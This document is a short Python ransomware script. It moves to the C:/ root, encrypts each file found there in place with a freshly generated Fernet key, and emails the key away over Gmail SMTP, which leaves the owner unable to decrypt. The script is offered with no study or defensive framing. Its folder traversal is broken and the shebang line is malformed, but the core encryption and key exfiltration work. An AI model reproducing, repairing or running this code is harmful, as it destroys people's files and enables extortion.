#!/usr/bin/env/ python3

import os
from cryptography.fernet import Fernet
import smtplib


def mail_send(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


files = []
directories = []


os.chdir("C:/")


for file in os.listdir():
 	if file == "ransom.py" or file == "decrypter.py":
		continue  # do not encrypt the current file we are working with or the key

	elif os.path.isfile(file):
		files.append(file)  # do not add if this is a directory, only if a file

	elif os.path.isdir(file):
		directories.append(file)


for dirs in directories:
	if dirs == "ransom.py" or dirs == "decrypter.py":
		continue  # do not encrypt the current file we are working with or the key

	elif os.path.isfile(dirs):
		files.append(dirs)

	elif os.path.isdir(dirs):
		os.chdir(dirs)


key = Fernet.generate_key()


for file in files:
	with open(file, "rb") as the_file:
		contents = the_file.read()

	contents_encrypted = Fernet(key).encrypt(contents)

	with open(file, "wb") as the_file:
		the_file.write(contents_encrypted)


mail_send("", "", key)
